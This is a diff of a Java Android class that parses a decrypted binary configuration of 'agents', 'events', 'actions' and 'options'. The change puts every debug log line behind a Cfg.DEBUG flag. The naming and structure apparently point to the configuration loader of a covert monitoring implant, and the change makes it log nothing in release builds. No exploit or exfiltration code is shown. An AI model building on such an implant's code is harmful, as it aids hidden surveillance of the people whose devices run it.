@@ -10,9 +10,7 @@ package com.android.service.conf;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.util.Map;
 
-import android.util.Config;
 import android.util.Log;
 
 import com.android.service.Debug;
@@ -22,7 +20,7 @@ import com.android.service.action.Action;
 import com.android.service.action.SubActionType;
 import com.android.service.agent.AgentConf;
 import com.android.service.agent.AgentType;
-import com.android.service.auto.AutoConfig;
+import com.android.service.auto.Cfg;
 import com.android.service.crypto.Crypto;
 import com.android.service.crypto.Keys;
 import com.android.service.event.EventConf;
@@ -184,7 +182,7 @@ public class Configuration {
 		}
 
 		confHash = (int) tempHash;
-		Log.d("QZ", TAG + " Configuration CRC: " + confHash);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Configuration CRC: " + confHash);
 		return confHash;
 	}
 
@@ -205,7 +203,7 @@ public class Configuration {
 			throw new GeneralException("Tag " + tag + " not found");
 		}
 
-		Log.d("QZ", TAG + " Tag " + tag + " found at: " + index);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Tag " + tag + " found at: " + index);
 		return index;
 	}
 
@@ -230,7 +228,7 @@ public class Configuration {
 		final int agentNum = wrappedClearConf.getInt(agentTag);
 		wrappedClearConf.position(agentTag + 4);
 
-		Log.d("QZ", TAG + " Number of agents: " + agentNum);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Number of agents: " + agentNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
@@ -244,7 +242,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled
 					+ " Params Len: " + plen);
 
 			AgentType type = AgentType.get(id);
@@ -252,7 +250,7 @@ public class Configuration {
 				final AgentConf a = new AgentConf(type, enabled, params);
 				status.addAgent(a);
 			} else {
-				Log.d("QZ", TAG + " Error (loadAgents): null key");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (loadAgents): null key");
 			}
 		}
 
@@ -280,7 +278,7 @@ public class Configuration {
 		final int eventNum = wrappedClearConf.getInt(eventTag);
 		wrappedClearConf.position(eventTag + 4);
 
-		Log.d("QZ", TAG + " Number of events: " + eventNum);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Number of events: " + eventNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
@@ -296,7 +294,7 @@ public class Configuration {
 
 			EventType type = EventType.get(typeId);
 
-			Log.d("QZ", TAG + " Configuration.java Event: " + type
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Configuration.java Event: " + type
 					+ " Action: " + action + " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
@@ -319,7 +317,7 @@ public class Configuration {
 	private void loadActions() throws GeneralException {
 		final int actionNum = wrappedClearConf.getInt();
 
-		Log.d("QZ", TAG + " Number of actions " + actionNum);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Number of actions " + actionNum);
 
 		try {
 			for (int i = 0; i < actionNum; i++) {
@@ -327,7 +325,7 @@ public class Configuration {
 
 				final Action a = new Action(i);
 
-				Log.d("QZ", TAG + " Action " + i + " SubActions: " + subNum);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Action " + i + " SubActions: " + subNum);
 
 				for (int j = 0; j < subNum; j++) {
 					final int type = wrappedClearConf.getInt();
@@ -340,7 +338,7 @@ public class Configuration {
 					}
 
 					if (a.addSubAction(type, params)) {
-						Log.d("QZ", TAG + " SubAction " + j + " Type: "
+						if(Cfg.DEBUG) Log.d("QZ", TAG + " SubAction " + j + " Type: "
 								+ SubActionType.get(type) + " Params Length: "
 								+ plen);
 					}
@@ -380,7 +378,7 @@ public class Configuration {
 		final int optionsNum = wrappedClearConf.getInt(optionsTag);
 		wrappedClearConf.position(optionsTag + 4);
 
-		Log.d("QZ", TAG + " Number of options: " + optionsNum);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Number of options: " + optionsNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < optionsNum; i++) {
@@ -393,7 +391,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", TAG + " Option: " + id + " Params Len: " + plen);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Option: " + id + " Params Len: " + plen);
 
 			final Option o = new Option(id, params);
 			status.addOption(o);
@@ -458,23 +456,23 @@ public class Configuration {
 			}
 
 			// Return decrypted conf
-			Log.d("QZ", TAG + " Configuration is valid");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Configuration is valid");
 			return;
 		} catch (final IOException ioe) {
-			if (AutoConfig.DEBUG) {
+			if (Cfg.DEBUG) {
 				ioe.printStackTrace();
 			}
-			Log.d("QZ", TAG + " IOException() detected");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " IOException() detected");
 		} catch (final SecurityException se) {
-			if (AutoConfig.DEBUG) {
+			if (Cfg.DEBUG) {
 				se.printStackTrace();
 			}
-			Log.d("QZ", TAG + " SecurityException() detected");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " SecurityException() detected");
 		} catch (final Exception e) {
-			if (AutoConfig.DEBUG) {
+			if (Cfg.DEBUG) {
 				e.printStackTrace();
 			}
-			Log.d("QZ", TAG + " Exception() detected");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Exception() detected");
 		}
 
 		return;
@@ -492,7 +490,7 @@ public class Configuration {
 	}
 
 	public static boolean isDebug() {
-		return AutoConfig.DEBUG;
+		return Cfg.DEBUG;
 	}
 
 }
